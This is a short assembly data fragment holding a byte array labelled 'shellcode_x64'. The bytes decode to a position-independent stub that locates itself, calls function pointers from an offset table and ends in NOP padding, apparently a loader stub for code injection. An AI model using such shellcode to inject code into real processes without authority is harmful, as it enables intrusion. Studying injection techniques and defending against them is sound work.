shellcode_x64: db 0x41,0x57,0x48,0x83,0xec,0x8,0xe8,0x0,0x0,0x0,0x0,0x41,0x5f,0x49,0x83,0xef,0xb,0xeb,0x0,0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x60,0x49,0x8b,0x8f,0x60,0x0,0x0,0x0,0x41,0xff,0x97,0x50,0x0,0x0,0x0,0x49,0x89,0x87,0x58,0x0,0x0,0x0,0x4c,0x89,0xf9,0x48,0x81,0xc1,0xd0,0x0,0x0,0x0,0x48,0x31,0xd2,0x41,0xff,0x97,0xc0,0x0,0x0,0x0,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
.len equ $ - shellcode_x64
